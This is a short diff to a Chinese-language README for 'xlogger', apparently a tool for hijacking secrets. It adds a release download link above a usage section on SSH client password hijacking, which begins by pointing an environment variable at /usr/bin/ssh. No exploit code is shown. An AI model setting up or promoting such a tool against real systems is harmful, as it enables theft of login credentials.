@@ -8,6 +8,8 @@ You Know, for secret hijack.
 
 ## 使用
 
+[releases下载](https://github.com/TheKingOfDuck/xlogger/releases)
+
 ### SSH Client 密码劫持
 ```bash
 export XPROGRAM="/usr/bin/ssh"
